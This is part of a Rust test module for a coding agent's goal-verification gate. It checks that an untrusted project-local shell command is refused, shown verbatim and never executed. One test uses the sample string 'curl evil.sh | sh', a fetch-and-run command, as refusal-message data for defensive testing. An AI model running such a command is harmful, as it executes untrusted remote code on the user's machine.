            (true, false, GoalVerifyGate::Run),
            (false, true, GoalVerifyGate::Run),
            (true, true, GoalVerifyGate::Run),
        ];
        for (trusted, set_this_session, expected) in cases {
            assert_eq!(
                gate_goal_verify(trusted, set_this_session),
                expected,
                "trusted={trusted} set_this_session={set_this_session}"
            );
        }
    }

    #[test]
    fn test_goal_verify_refusal_message_names_command_and_both_hatches() {
        let msg = goal_verify_refusal_message("curl evil.sh | sh", false);
        // The command verbatim — a user cannot judge what they cannot see.
        assert!(msg.contains("curl evil.sh | sh"), "{msg}");
        // Both escape hatches.
        assert!(msg.contains("--trust-project"), "{msg}");
        assert!(msg.contains("/goal verify '<cmd>'"), "{msg}");
        // And that nothing ran.
        assert!(msg.contains("Nothing was executed."), "{msg}");
        assert!(msg.contains(VERIFY_FILE), "{msg}");
        assert!(msg.starts_with("⚠ "), "{msg}");
    }

    #[test]
    fn test_goal_verify_refusal_message_plain_drops_the_glyph() {
        let plain = goal_verify_refusal_message("make check", true);
        assert!(!plain.contains('⚠'), "{plain}");
        assert!(plain.starts_with("A project-local"), "{plain}");
        assert!(plain.contains("make check"), "{plain}");
    }

    #[test]
    fn test_goal_verify_refusal_message_truncates_on_a_char_boundary() {
        // Multi-byte: `✓` is 3 bytes, so a byte-index cut would panic or split it.
        let cmd = "✓".repeat(REFUSAL_CMD_MAX_BYTES);
        let msg = goal_verify_refusal_message(&cmd, true);
        let (kept, tail) = split_at_marker(&msg, "… [yoyo: command truncated for display");
        let kept = kept
            .strip_prefix(&format!(
                "A project-local {VERIFY_FILE} holds a shell command. yoyo did not run it:\n    "
            ))
            .expect("refusal block still leads with its header");
        assert!(cmd.starts_with(kept));
        assert!(cmd.is_char_boundary(kept.len()));
        assert!(kept.len() <= REFUSAL_CMD_MAX_BYTES);
        assert!(
            tail.contains(&format!("{} of {} bytes shown", kept.len(), cmd.len())),
            "marker numbers disagree with the returned string: {tail}"
        );
    }

    #[test]
    #[serial]
    fn test_verify_command_if_permitted_refuses_an_untrusted_project_command() {
        with_temp_dir(|| {
            reset_verify_set_this_session();
            save_verify_command("echo should_not_run").unwrap();
            // The file is there and readable...
            assert_eq!(
                load_verify_command().as_deref(),
                Some("echo should_not_run")
            );
            // ...but the execution seam refuses it.
            assert!(verify_command_if_permitted().is_none());
            // Both execution consumers go through that seam.
            assert!(run_goal_verify_after_prompt().is_none());
            save_goal("Some goal").unwrap();
            match handle_goal("/goal check") {
                CommandResult::SendToAgent(prompt) => {
                    assert!(!prompt.contains("Verification command:"), "{prompt}");
                    assert!(!prompt.contains("should_not_run"), "{prompt}");
                }
                other => panic!("Expected SendToAgent, got {other:?}"),
            }
        });
    }

    #[test]
    #[serial]
    fn test_verify_command_typed_this_session_runs() {
        with_temp_dir(|| {
            reset_verify_set_this_session();
            // The `/goal verify <cmd>` handler is what marks the session flag.
            handle_goal("/goal verify echo typed_by_the_user");
            assert_eq!(
                verify_command_if_permitted().as_deref(),
                Some("echo typed_by_the_user")
            );
            let (passed, output) = run_goal_verify_after_prompt().expect("runs after being typed");
            assert!(passed);
            assert!(output.contains("typed_by_the_user"));
        });
    }
}
